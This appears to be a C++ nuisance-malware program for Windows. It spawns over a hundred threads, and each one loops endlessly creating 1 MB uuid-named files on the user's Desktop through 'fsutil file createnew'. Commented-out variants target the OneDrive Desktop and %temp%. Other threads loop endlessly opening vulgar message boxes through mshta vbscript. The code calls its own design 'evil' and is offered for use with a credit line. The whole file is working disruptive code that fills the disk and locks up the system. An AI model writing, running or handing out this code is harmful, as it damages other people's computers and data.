//credit me: https://github.com/ImSoBored420
#include <iostream>
#include <string> //used for the "to string function
#include <thread> //used for multithreading 
#include <boost/uuid/uuid.hpp> //all of these uuid thingys for uuid
#include <boost/uuid/uuid_generators.hpp>
#include <boost/uuid/uuid_io.hpp>

using namespace std;

const string USER_PROFILE = getenv("USERPROFILE"); //get user profile because you need it for specific paths
string path = USER_PROFILE + "\\OneDrive\\Desktop"; //win 11 desktop path - or more specifically - people who have onedrive
string pathLegacy = USER_PROFILE + "\\Desktop"; //older windows desktop path


void fileSpammr() { //loop uuid name generation and file creation
	while (true) {
		boost::uuids::random_generator generator;
		boost::uuids::uuid id = generator();
		string uuid = to_string(id);
		cout << uuid;

		//system(("fsutil file createnew " + path + "\\" + uuid + ".txt 1048576").c_str()); //works for win11 (visible to onedrvie users but still makes the path regardless of if you actually have it or not)
		//system(("fsutil file createnew %temp%\\" + uuid + " 1048576").c_str()); //temp flood because they use uuid anyways
		system(("fsutil file createnew " + pathLegacy + "\\" + uuid + ".txt 1048576").c_str()); //works for windows 10 and below I THINK (or if win11 doesn't use onedrive)
	}

}

void msgBoxes() {
	while (true) {
		system("mshta vbscript:Execute(\"msgbox \"\"*FAWK* YOU MEAN\"\", 0, \"\"Say man I got bad bitches at the crib\"\":close\")");
	}
}

void msgBoxess() {
	system("mshta vbscript:Execute(\"msgbox \"\"같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같같\"\", 0, \"\"What if...\"\":close\")");
}

void threadMultiplier() { //creates threads and runs them simultaneously for the filespam function
	thread spam1(fileSpammr); thread spam2(fileSpammr);
	thread spam3(fileSpammr); thread spam4(fileSpammr);
	thread spam5(fileSpammr); thread spam6(fileSpammr);
	thread spam7(fileSpammr); thread spam8(fileSpammr);
	thread spam9(fileSpammr); thread spam10(fileSpammr);
	thread spam11(fileSpammr); thread spam12(fileSpammr);
	thread spam13(fileSpammr); thread spam14(fileSpammr);
	thread spam15(fileSpammr); thread spam16(fileSpammr);
	spam1.detach(); spam2.detach();
	spam3.detach(); spam4.detach();
	spam5.detach(); spam6.detach();
	spam7.detach(); spam8.detach();
	spam9.detach(); spam10.detach();
	spam11.detach(); spam12.detach();
	spam13.detach(); spam14.detach();
	spam15.detach(); spam16.detach();
}


int main() {
	/*/
	multi-multithreading because it's evil (128 threads)
	(yes this actually works to make 128 threads)
	but first initialize the popup spam function
	/*/
	thread mult1(threadMultiplier); thread mult2(threadMultiplier);
	thread mult3(threadMultiplier); thread mult4(threadMultiplier);
	thread mult5(threadMultiplier); thread mult6(threadMultiplier);
	thread mult7(threadMultiplier); thread mult8(threadMultiplier);
	mult1.detach(); mult2.detach();
	mult3.detach(); mult4.detach();
	mult5.detach(); mult6.detach();
	mult7.detach(); mult8.detach();


	//separate messagebox threads because that's how it goes
	thread msg1(msgBoxes); thread msg2(msgBoxes);
	thread msg3(msgBoxes); thread msg4(msgBoxes);
	thread msg5(msgBoxess); thread msg6(msgBoxess);
	thread msg7(msgBoxess); thread msg8(msgBoxess);
	msg1.detach(); msg2.detach();
	msg3.detach(); msg4.detach();
	msg5.detach(); msg6.detach();
	msg7.detach(); msg8.join();

	return 0;
}